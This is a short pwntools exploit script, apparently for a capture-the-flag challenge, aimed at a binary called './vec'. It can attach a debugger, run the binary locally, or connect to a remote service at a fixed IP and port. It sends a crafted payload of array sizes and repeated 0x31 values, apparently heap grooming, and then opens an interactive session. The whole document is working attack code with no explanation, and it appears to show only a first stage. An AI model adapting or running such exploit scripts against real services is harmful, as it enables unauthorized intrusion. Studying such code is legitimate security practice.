#!/usr/bin/python3
import pwn
path = './vec'
elf = pwn.context.binary = pwn.ELF(path)
if pwn.args.GDB:
    io = pwn.gdb.debug(path, gdbscript="")
else:
    if pwn.args.REMOTE:
        io = pwn.remote("143.198.184.186", 5003)
    else:
        io = elf.process()


def s(d):
    global payload
    payload += str(d).encode() + b"\n"


def create_array(n, q, nums):
    s(str(n) + " "+str(q))
    for i in range(n):
        s(nums)


payload = b""
T = 2
io.sendline(f"{T}".encode())
create_array(90, 1, 0x31)
# s("1\n1\n"+str(0x31))
io.sendline(payload)
io.interactive()
